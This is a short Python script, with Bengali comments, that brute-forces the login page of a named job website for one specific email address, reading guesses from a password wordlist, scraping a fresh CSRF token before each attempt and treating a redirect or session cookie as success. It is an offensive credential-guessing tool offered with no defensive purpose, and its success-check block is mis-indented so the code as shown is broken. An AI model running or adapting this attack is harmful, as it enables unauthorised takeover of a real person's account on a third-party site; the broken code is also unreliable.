import requests, time, re

url = "https://workupjob.com/login"
username = "jobayerkhanxyz0000@gmail.com"
wordlist = "passwords.txt"

session = requests.Session()
session.headers.update({"User-Agent": "Mozilla/5.0"})

with open(wordlist) as f:
    for pwd in f:
        pwd = pwd.strip()
        print(f"[*] Trying password: {pwd}")

        # প্রতি বার নতুন CSRF token নাও
        try:
            resp = session.get(url, timeout=10)
            m = re.search(r'name="_token" value="([^"]+)"', resp.text)
            if not m:
                print("[-] CSRF token not found. Skipping...")
                continue
            csrf = m.group(1)
            print(f"[+] CSRF Token: {csrf}")
        except Exception as e:
            print(f"[!] Token request failed: {e}")
            continue

        data = {
            "_token": csrf,
            "login_email": username,
            "login_password": pwd,
            "login_do": "Login"
        }

        try:
            resp = session.post(url, data=data, allow_redirects=True, timeout=10)
            print(f"Status: {resp.status_code}, Final URL: {resp.url}")
            print("Cookies:", session.cookies.get_dict())

            # সফল লগইন চেক
            if resp.url.endswith("/job") or "session" in session.cookies.get_dict():
    print(f"[✅] Valid password found: {pwd}")
    break
else:
    print(f"[-] Invalid: {pwd}")
                snippet = resp.text[:300].replace("\n", " ")
                print("[Snippet]:", snippet[:300])

        except Exception as e:
            print(f"[!] Exception: {e}")

        time.sleep(2)